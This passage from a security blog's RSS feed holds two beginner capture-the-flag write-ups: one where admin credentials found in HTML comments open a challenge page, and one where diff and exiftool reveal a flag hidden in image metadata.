+data-flex-grow="640"
+data-flex-basis="1536px"
+>&lt;/p>
+&lt;p>Once again, I inspected the code of this page and came across some interesting comments. It seemed that the web developer forgot to remove the comments containing login credentials for the admin user.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration5.jpg"
+width="1920"
+height="500"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration5_hu154472781002745671.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration5_hu1116697367029928119.jpg 1024w"
+loading="lazy"
+alt="admin login"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;p>Page code inspection follows:
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration6.jpg"
+width="1920"
+height="500"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration6_hu15791100942695350022.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration6_hu5673465598561160528.jpg 1024w"
+loading="lazy"
+alt="adminpage inspection"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>Using the credentials found in the comments, I successfully logged in as an admin user, which led me to a new page containing the flag for the challenge.&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In conclusion, this challenge provided a great opportunity to apply web enumeration techniques to uncover hidden information and identify potential vulnerabilities. The process involved inspecting the underlying code, using gobuster for directory enumeration, understanding the significance of robots.txt files, and recognizing the importance of secure coding practices.&lt;/p>
+&lt;p>As a hacker, it&amp;rsquo;s crucial to continuously explore and learn new techniques. Happy hacking, and never stop learning!&lt;/p>
+&lt;p>dr0idbot out.&lt;/p></description></item><item><title>Keep it Simple</title><link>https://hushkat.github.io/p/keep-it-simple/</link><pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/keep-it-simple/</guid><description>&lt;img src="https://hushkat.github.io/p/keep-it-simple/The%20eye.jpg" alt="Featured image of post Keep it Simple" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Welcome to another exciting journey into the world of Cybersec and its mysteries! In this blog post, we&amp;rsquo;ll explore a captivating gamified challenge in the field of Digital Forensics. Join me as we dive into the intriguing world of &lt;a class="link" href="https://en.wikipedia.org/wiki/Capture_the_flag_%28cybersecurity%29" target="_blank" rel="noopener"
+>Capture The Flag&lt;/a> and unravel the secrets behind the challenge titled &amp;lsquo;Keep it Simple.&amp;rsquo; This challenge is part of the &lt;strong>Introduction to Cybersecurity (Online)&lt;/strong> series that I have been looking into over the past few days and can be found &lt;a class="link" href="https://cybertalents.com/challenges/forensics/keep-it-simple" target="_blank" rel="noopener"
+>here&lt;/a>.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="unveiling-the-enigma-keep-it-simple-challenge">Unveiling the Enigma: Keep it Simple Challenge.
+&lt;/h3>&lt;p>The challenge description had the string: &lt;em>The answer is simple&lt;/em>(as you will see, it truly is simple). The more one can gather from here is that it&amp;rsquo;s a Digital Forensics challenge titled: &lt;em>Keep it simple&lt;/em> Upon clicking the green &amp;ldquo;Start Challenge&amp;rdquo; button, I was presented with a link to a webpage that looks like this:&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/keep-it-simple/KeepitSimple.jpg"
+width="899"
+height="505"
+srcset="https://hushkat.github.io/p/keep-it-simple/KeepitSimple_hu16240892784077703362.jpg 480w, https://hushkat.github.io/p/keep-it-simple/KeepitSimple_hu17228543167713986292.jpg 1024w"
+loading="lazy"
+alt="login page"
+class="gallery-image"
+data-flex-grow="178"
+data-flex-basis="427px"
+>&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>As usual, the first thing I always try to do with these challenges, is to inspect the page where its hosted for hints or clues on how to proceed with an attempt. The trick is to be as keen as you can when doing this so as not to miss on any breadcrumbs :D. At first glance, the webpage source code looks normal but on taking a closer look you notice a reference to two images with only one being embedded on the webpage. My curiosity kicked in:&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/keep-it-simple/KeepitSimple0.jpg"
+width="899"
+height="506"
+srcset="https://hushkat.github.io/p/keep-it-simple/KeepitSimple0_hu11928366244205087209.jpg 480w, https://hushkat.github.io/p/keep-it-simple/KeepitSimple0_hu2185542655299355104.jpg 1024w"
+loading="lazy"
+alt="Code inspection"
+class="gallery-image"
+data-flex-grow="177"
+data-flex-basis="426px"
+>&lt;/p>
+&lt;p>So I downloaded both the images, to get a closer look and see if there is something out of the ordinary about them. The first image that was embedded on the webpage I saved as is, that is &lt;em>the_eye.jpeg&lt;/em> and image two (hidden hint in source code) saved as &lt;em>the_eye0.jpeg&lt;/em>. Again at first glance, everything about this images looks the same, from file size, dimensions of the image and most obviously their outlook. So we have to use the eye of a thief, to see what others dont. Here is a glimpse of both the images:&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/keep-it-simple/KeepitSimple1.jpg"
+width="899"
+height="505"
+srcset="https://hushkat.github.io/p/keep-it-simple/KeepitSimple1_hu1518474016826426942.jpg 480w, https://hushkat.github.io/p/keep-it-simple/KeepitSimple1_hu6158204334928775129.jpg 1024w"
+loading="lazy"
+alt="Images in code"
+class="gallery-image"
+data-flex-grow="178"
+data-flex-basis="427px"
+>&lt;/p>
+&lt;p>Next, I decide to compare the images using &lt;a class="link" href="https://www.geeksforgeeks.org/diff-command-linux-examples/" target="_blank" rel="noopener"
+>diff&lt;/a> command from the terminal to compare if the images are actually the same or not. Here is the output from the comparison:&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/keep-it-simple/KeepitSimple2.jpg"
+width="899"
+height="506"
+srcset="https://hushkat.github.io/p/keep-it-simple/KeepitSimple2_hu8336782173713008941.jpg 480w, https://hushkat.github.io/p/keep-it-simple/KeepitSimple2_hu7075765106569818333.jpg 1024w"
+loading="lazy"
+alt="diff output"
+class="gallery-image"
+data-flex-grow="177"
+data-flex-basis="426px"
+>&lt;/p>
+&lt;p>We are seeing here that the two files actually differ, which makes me more curious and I therefore decide to look at the images &lt;a class="link" href="https://iptc.org/standards/photo-metadata/photo-metadata/" target="_blank" rel="noopener"
+>metadata&lt;/a> using the &lt;a class="link" href="https://en.wikipedia.org/wiki/ExifTool" target="_blank" rel="noopener"
+>exiftool&lt;/a> and here out attention is drawn to the difference of the two images that we normally wouldnt have seen from just looking at the pictures.&lt;/p>
+&lt;p>&lt;strong>I try as much as I can to link additional information on new terms and tools used in the blog check them out to learn more.&lt;/strong>&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>To look at the metadata of both the images we type the command &lt;em>exiftool&lt;/em> followed by the filename. See the image below for output comparison.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/keep-it-simple/KeepitSimple33.png"
+width="1917"
+height="921"
+srcset="https://hushkat.github.io/p/keep-it-simple/KeepitSimple33_hu9346401746534122915.png 480w, https://hushkat.github.io/p/keep-it-simple/KeepitSimple33_hu16397701165447963909.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="208"
+data-flex-basis="499px"
+>.&lt;/p>
+&lt;p>&lt;strong>Kudos!!&lt;/strong> We now captured the flag.I have obfuscated the flag to keep the integrity of the challenge.&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In conclusion, this challenge reminds us that sometimes the answers are simple and can be found in plain sight. By honing our observation skills and utilizing powerful tools like diff and exiftool, we can uncover hidden secrets. Remember, even in the world of cybersecurity, simplicity can hold the key to success. Keep exploring, keep hacking, and never stop learning! Happy Hacking. dr0idbot out.&lt;/p></description></item></channel></rss>
